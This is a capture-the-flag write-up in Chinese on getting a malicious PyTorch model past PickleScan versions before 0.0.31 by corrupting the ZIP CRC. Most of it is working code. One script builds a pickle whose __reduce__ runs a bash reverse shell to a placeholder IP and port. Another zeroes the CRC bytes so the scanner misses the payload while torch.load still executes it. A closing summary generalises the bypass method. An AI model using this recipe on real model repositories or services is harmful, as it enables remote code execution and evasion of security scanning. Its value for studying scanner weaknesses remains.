# Nailong

## 题目简述

题目围绕 Hugging Face 生态中的 PickleScan 检测绕过。PickleScan 0.0.31 之前在扫描 ZIP 归档中的恶意 pickle 文件时存在缺陷：如果 ZIP 内文件 CRC 被破坏，扫描器可能无法正确识别其中的恶意 pickle，但后续加载模型时仍会触发 pickle 反序列化。

目标是构造一个 PyTorch 模型文件，让扫描阶段漏报，运行阶段执行命令。

## 解题过程

### 构造恶意 pickle

PyTorch 的 `torch.save` 本质上会序列化 Python 对象。定义对象的 `__reduce__`，让反序列化时调用 `exec`：

```python
import torch

args = """
os.system('bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"')
"""

class Exp(object):
    def __reduce__(self):
        return (exec, (args,))

torch.save(Exp(), "InjectModel2.pt")
```

这里 payload 可以换成反弹 shell、命令执行或读取 flag 的命令，具体取决于题目服务如何加载模型。

### 破坏 ZIP CRC 绕过扫描

`.pt` 文件是 ZIP 结构。先读取第一个条目的 CRC，再把文件中对应 CRC 字节替换为 `0`：

```python
import zipfile

with zipfile.ZipFile("InjectModel2.pt", "r") as zf:
    crc = zf.infolist()[0].CRC

with open("InjectModel2.pt", "rb") as f:
    data = f.read()

evil_data = data.replace(crc.to_bytes(4, "little"), b"\x00\x00\x00\x00")

with open("InjectModel2x.pt", "wb") as f:
    f.write(evil_data)
```

旧版 PickleScan 在这种坏 CRC ZIP 上扫描失效，但目标服务如果仍把文件交给 PyTorch 加载，就会执行 `__reduce__` 中的 payload。

## 方法总结

- 核心技巧：构造 PyTorch pickle RCE，并通过破坏 ZIP CRC 绕过旧版 PickleScan。
- 识别信号：上传模型文件、服务声称用 PickleScan 或类似工具做静态扫描、模型最终仍会被 `torch.load` 一类接口加载。
- 复用要点：安全扫描器与真实解析器的容错行为可能不同。利用时要让扫描器失败或漏报，同时保证目标加载路径仍会触发反序列化。
